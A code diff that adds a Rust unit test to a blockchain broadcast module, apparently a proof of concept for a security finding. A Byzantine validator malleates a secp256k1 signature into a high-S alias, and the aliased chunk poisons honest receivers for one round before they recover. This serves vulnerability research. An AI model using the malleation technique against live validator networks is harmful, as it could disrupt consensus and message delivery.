@@ -1,0 +1,323 @@
+diff --git a/monad-raptorcast/src/udp.rs b/monad-raptorcast/src/udp.rs
+index e9d65609..afd57c83 100644
+--- a/monad-raptorcast/src/udp.rs
++++ b/monad-raptorcast/src/udp.rs
+@@ -2184,4 +2184,318 @@ mod tests_deterministic {
+             assert_eq!(pp.payload, vp.payload);
+         }
+     }
++
++    fn research_sub_be_32_high_s(a: &[u8; 32], b: &[u8; 32]) -> [u8; 32] {
++        let mut out = [0u8; 32];
++        let mut borrow = 0u16;
++        for i in (0..32).rev() {
++            let ai = a[i] as u16;
++            let bi = b[i] as u16 + borrow;
++            if ai >= bi {
++                out[i] = (ai - bi) as u8;
++                borrow = 0;
++            } else {
++                out[i] = (ai + 256 - bi) as u8;
++                borrow = 1;
++            }
++        }
++        assert_eq!(borrow, 0);
++        out
++    }
++
++    fn research_malleate_recoverable_signature(payload: &bytes::Bytes) -> bytes::Bytes {
++        use bytes::BytesMut;
++
++        let mut out = BytesMut::from(payload.as_ref());
++        assert!(out.len() >= crate::SIGNATURE_SIZE);
++        let mut low_s = [0u8; 32];
++        low_s.copy_from_slice(&out[32..64]);
++        let high_s = research_sub_be_32_high_s(
++            &[
++                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
++                0xff, 0xfe, 0xba, 0xae, 0xdc, 0xe6, 0xaf, 0x48, 0xa0, 0x3b, 0xbf, 0xd2, 0x5e, 0x8c,
++                0xd0, 0x36, 0x41, 0x41,
++            ],
++            &low_s,
++        );
++        out[32..64].copy_from_slice(&high_s);
++        out[64] ^= 1;
++        out.freeze()
++    }
++
++    #[test]
++    fn malicious_v1_high_s_alias_is_one_round_only_under_accept_both_publish_v0() {
++        use std::{
++            collections::BTreeMap,
++            net::{IpAddr, Ipv4Addr, SocketAddr},
++        };
++
++        use monad_crypto::{
++            certificate_signature::{CertificateKeyPair, PubKey as _},
++            hasher::{Hasher, HasherType},
++        };
++        use monad_secp::{KeyPair, SecpSignature};
++        use monad_types::{Epoch, NodeId, Round, Stake};
++        use monad_validator::validator_set::ValidatorSet;
++
++        use crate::{
++            auth::AuthRecvMsg,
++            packet::{deterministic::PrimaryEncoding, MessageBuilder},
++            util::{
++                BuildTarget, EncodingScheme, FullNodeGroupMap, PrimaryBroadcastGroup, Redundancy,
++                StubProposerSchedule,
++            },
++            v1_rollout::DeterministicProtocolRolloutStage,
++        };
++
++        fn key(seed: u8) -> KeyPair {
++            let mut hasher = HasherType::new();
++            hasher.update([seed]);
++            let mut bytes = hasher.hash().0;
++            KeyPair::from_bytes(&mut bytes).expect("valid deterministic key")
++        }
++
++        let byzantine_key = key(1);
++        let honest_one_key = key(2);
++        let honest_two_key = key(3);
++        let honest_three_key = key(4);
++
++        let byzantine = NodeId::new(byzantine_key.pubkey());
++        let honest_one = NodeId::new(honest_one_key.pubkey());
++        let honest_two = NodeId::new(honest_two_key.pubkey());
++        let honest_three = NodeId::new(honest_three_key.pubkey());
++
++        let epoch = Epoch(1);
++        let poisoned_round = Round(42);
++        let recovery_round = Round(43);
++        let validators = ValidatorSet::new_unchecked(
++            [
++                (byzantine, Stake::ONE),
++                (honest_one, Stake::ONE),
++                (honest_two, Stake::ONE),
++                (honest_three, Stake::ONE),
++            ]
++            .into(),
++        );
++        let validator_map: BTreeMap<_, _> = [(epoch, validators.clone())].into();
++
++        let poisoned_group =
++            PrimaryBroadcastGroup::of_epoch(epoch, &byzantine, &validator_map).unwrap();
++        let poisoned_message = vec![0xA5u8; 128 * 1024];
++        let poisoned_timestamp = 1_700_000_000_000u64;
++        let poisoned_packets = MessageBuilder::<SecpSignature>::new(&byzantine_key)
++            .unix_ts_ms(poisoned_timestamp)
++            .redundancy(Redundancy::from_u8(2))
++            .build_vec(
++                &poisoned_message,
++                &BuildTarget::deterministic_raptorcast(poisoned_group, poisoned_round),
++            )
++            .expect("deterministic V1 message builds");
++        assert!(poisoned_packets.len() > 2);
++
++        let feed = |state: &mut UdpState<SecpSignature>,
++                    payload: bytes::Bytes,
++                    stride: usize,
++                    sender: NodeId<monad_secp::PubKey>| {
++            state.handle_message(
++                &validator_map,
++                &FullNodeGroupMap::default(),
++                &StubProposerSchedule::VALID,
++                |_, _, _| {},
++                AuthRecvMsg {
++                    src_addr: SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), 9000),
++                    payload,
++                    stride: u16::try_from(stride).unwrap(),
++                    sender: Some(sender),
++                },
++            )
++        };
++
++        let mut honest_one_state = UdpState::<SecpSignature>::new(honest_one, u64::MAX, 10_000);
++        let mut honest_two_state = UdpState::<SecpSignature>::new(honest_two, u64::MAX, 10_000);
++        let mut honest_three_state = UdpState::<SecpSignature>::new(honest_three, u64::MAX, 10_000);
++
++        for state in [
++            &mut honest_one_state,
++            &mut honest_two_state,
++            &mut honest_three_state,
++        ] {
++            state.set_v1_rollout(DeterministicProtocolRolloutStage::AcceptBothPublishV0);
++            state.update_current_round(poisoned_round);
++        }
++
++        // Use a first-hop chunk which the deterministic assignment routes to
++        // the Byzantine validator. The attacker can legitimately receive this
++        // chunk, malleate only its recoverable signature, then forward it to
++        // the two honest non-proposer receivers.
++        let assignment_group =
++            PrimaryBroadcastGroup::of_epoch(epoch, &byzantine, &validator_map).unwrap();
++        let encoding = PrimaryEncoding::new(
++            EncodingScheme::Deterministic25(poisoned_round),
++            &assignment_group,
++            poisoned_message.len(),
++            poisoned_timestamp,
++        )
++        .expect("primary deterministic encoding builds");
++        let assignment = encoding.make_assignment().expect("assignment builds");
++        let poison_index = (0usize..assignment.num_chunks())
++            .find(|chunk_id| {
++                assignment
++                    .resolve_chunk_id(*chunk_id)
++                    .is_some_and(|routing| routing.recipient() == &byzantine)
++            })
++            .expect("Byzantine validator receives at least one first-hop chunk");
++
++        let alias =
++            research_malleate_recoverable_signature(&poisoned_packets[poison_index].payload);
++        assert_ne!(alias, poisoned_packets[poison_index].payload);
++
++        assert_eq!(
++            feed(
++                &mut honest_one_state,
++                alias.clone(),
++                poisoned_packets[poison_index].stride,
++                byzantine,
++            )
++            .len(),
++            0,
++        );
++        assert_eq!(
++            feed(
++                &mut honest_two_state,
++                alias,
++                poisoned_packets[poison_index].stride,
++                byzantine,
++            )
++            .len(),
++            0,
++        );
++
++        let poisoned_one: usize = poisoned_packets
++            .iter()
++            .map(|packet| {
++                feed(
++                    &mut honest_one_state,
++                    packet.payload.clone(),
++                    packet.stride,
++                    byzantine,
++                )
++                .len()
++            })
++            .sum();
++        let poisoned_two: usize = poisoned_packets
++            .iter()
++            .map(|packet| {
++                feed(
++                    &mut honest_two_state,
++                    packet.payload.clone(),
++                    packet.stride,
++                    byzantine,
++                )
++                .len()
++            })
++            .sum();
++        let clean_three: usize = poisoned_packets
++            .iter()
++            .map(|packet| {
++                feed(
++                    &mut honest_three_state,
++                    packet.payload.clone(),
++                    packet.stride,
++                    byzantine,
++                )
++                .len()
++            })
++            .sum();
++
++        eprintln!("MARKER_DEFAULT_STAGE_V1_CONTROL_ROUND42={clean_three}");
++        eprintln!("MARKER_POISONED_HONEST_ONE_ROUND42={poisoned_one}");
++        eprintln!("MARKER_POISONED_HONEST_TWO_ROUND42={poisoned_two}");
++        assert_eq!(
++            clean_three, 1,
++            "AcceptBothPublishV0 receivers accept valid V1"
++        );
++        assert_eq!(
++            poisoned_one, 0,
++            "high-S alias poisons the first honest receiver"
++        );
++        assert_eq!(
++            poisoned_two, 0,
++            "high-S alias poisons the second honest receiver"
++        );
++
++        for state in [
++            &mut honest_one_state,
++            &mut honest_two_state,
++            &mut honest_three_state,
++        ] {
++            state.update_current_round(recovery_round);
++        }
++
++        let recovery_group =
++            PrimaryBroadcastGroup::of_epoch(epoch, &honest_three, &validator_map).unwrap();
++        let recovery_message = vec![0x5Au8; 128 * 1024];
++        let recovery_packets = MessageBuilder::<SecpSignature>::new(&honest_three_key)
++            .unix_ts_ms(1_700_000_001_000u64)
++            .redundancy(Redundancy::from_u8(2))
++            .build_vec(
++                &recovery_message,
++                &BuildTarget::deterministic_raptorcast(recovery_group, recovery_round),
++            )
++            .expect("honest recovery V1 message builds");
++
++        let recovered_one: usize = recovery_packets
++            .iter()
++            .map(|packet| {
++                feed(
++                    &mut honest_one_state,
++                    packet.payload.clone(),
++                    packet.stride,
++                    honest_three,
++                )
++                .len()
++            })
++            .sum();
++        let recovered_two: usize = recovery_packets
++            .iter()
++            .map(|packet| {
++                feed(
++                    &mut honest_two_state,
++                    packet.payload.clone(),
++                    packet.stride,
++                    honest_three,
++                )
++                .len()
++            })
++            .sum();
++        let recovered_three: usize = recovery_packets
++            .iter()
++            .map(|packet| {
++                feed(
++                    &mut honest_three_state,
++                    packet.payload.clone(),
++                    packet.stride,
++                    honest_three,
++                )
++                .len()
++            })
++            .sum();
++
++        eprintln!("MARKER_RECOVERED_HONEST_ONE_ROUND43={recovered_one}");
++        eprintln!("MARKER_RECOVERED_HONEST_TWO_ROUND43={recovered_two}");
++        eprintln!("MARKER_RECOVERED_HONEST_THREE_ROUND43={recovered_three}");
++        assert_eq!(
++            recovered_one, 1,
++            "first poisoned receiver recovers as a network receiver"
++        );
++        assert_eq!(
++            recovered_two, 1,
++            "second poisoned receiver recovers as a network receiver"
++        );
++        assert_eq!(
++            recovered_three, 0,
++            "the honest proposer owns the proposal locally and is not its own first-hop receiver",
++        );
++        eprintln!("MARKER_TEST_COMPLETE=1");
++    }
+ }
